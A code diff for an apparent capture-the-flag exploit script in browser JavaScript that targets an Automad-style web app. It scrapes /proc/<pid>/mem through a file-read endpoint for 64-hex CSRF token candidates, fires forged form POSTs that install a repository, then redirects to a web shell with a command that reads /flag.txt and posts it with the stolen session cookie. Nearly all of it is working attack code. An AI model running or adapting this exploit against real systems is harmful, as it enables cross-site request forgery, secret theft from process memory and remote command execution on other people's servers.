@@ -17,8 +17,16 @@ const cmd=()=>{
  let ck=document.cookie.split(';')[0];
  return `curl -s -X POST http://app/edit -H "Cookie: ${ck}" --data title=flag --data-urlencode content="$(python3 -c 'print(open(\"/flag.txt\",\"rb\").read().hex())')"`;
 };
-const install=csrf=>{
- post('csrf '+csrf.slice(0,16));
+const candidates=new Set();
+const addCandidates=d=>{
+ let m=(d.toLowerCase().match(/[a-f0-9]{64}/g)||[]);
+ for(let x of m){
+  if(candidates.size>=60)break;
+  if(/^([a-f0-9])\1+$/.test(x))continue;
+  candidates.add(x);
+ }
+};
+const submitToken=csrf=>{
  let w=open('about:blank','amcsrf');
  let f=document.createElement('form');
  f.method='POST';
@@ -29,10 +37,19 @@ const install=csrf=>{
  a('__json__',JSON.stringify(REPO));
  document.body.appendChild(f);
  f.submit();
- setTimeout(()=>{location.href=SHELL+'?cmd='+encodeURIComponent(cmd())},25000);
+};
+const tryInstall=()=>{
+ let arr=[...candidates].slice(0,40);
+ post('candidates '+arr.length);
+ arr.forEach((csrf,i)=>setTimeout(()=>{
+  post('try '+(i+1));
+  submitToken(csrf);
+ },i*650));
+ setTimeout(()=>{location.href=SHELL+'?cmd='+encodeURIComponent(cmd())},Math.max(35000,arr.length*650+25000));
 };
 const tryChunk=d=>{
  let low=d.toLowerCase();
+ addCandidates(low);
  if(!(low.includes('csrf')||low.includes('__csrf__')||low.includes('automad')||low.includes('dashboard')||low.includes('/_api')))return '';
  let m=low.match(/[a-f0-9]{64}/g)||[];
  return m.find(x=>!/^0+$/.test(x))||'';
@@ -78,11 +95,13 @@ for(let pid=1;pid<5000;pid++){
    if(scanned>260){post('scan limit');break}
    let d=await rt('/proc/'+pid+'/mem?offset=0x'+off.toString(16)+'&limit=8000');
    let z=tryChunk(d);
-   if(z){install(z);return}
+   if(z){candidates.add(z)}
+   if(candidates.size>=60){tryInstall();return}
   }
   if(scanned>260)break;
  }
  if(pc>=3)break;
 }
+if(candidates.size){tryInstall();return}
 post('csrf not found pids '+pc);
 })();
